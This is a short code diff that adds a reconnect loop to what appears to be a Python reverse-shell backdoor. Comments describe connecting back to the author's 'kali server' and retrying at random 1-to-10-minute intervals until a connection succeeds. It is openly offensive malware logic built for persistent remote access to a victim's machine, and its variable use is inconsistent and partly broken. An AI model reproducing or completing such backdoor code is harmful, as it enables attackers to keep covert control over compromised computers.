@@ -123,4 +123,24 @@ def connect():
 
 # Here we start our infinite loop, we try to connect to our kali server, if we got an exception (connection error)
 # then we will sleep for a random time between 1 and 10 seconds and we will pass that exception and go back to the 
-# i
+# infinite loop once again untill we got a sucessful connection.
+
+
+while True:
+    
+    try:
+        if connect() == 1:
+            sock.send("Connection is shutting down ..................\n\n")
+            s.close()
+            break
+        
+    except:
+        sleep_for = random.randrange(1, 10)
+        #time.sleep( sleep_for )        #Sleep for a random time between 1-10 seconds
+        time.sleep( sleep_for * 60 )  #Sleep for a random time between 1-10 minutes
+        pass
+
+def main ():
+    connect()
+main()
+main()
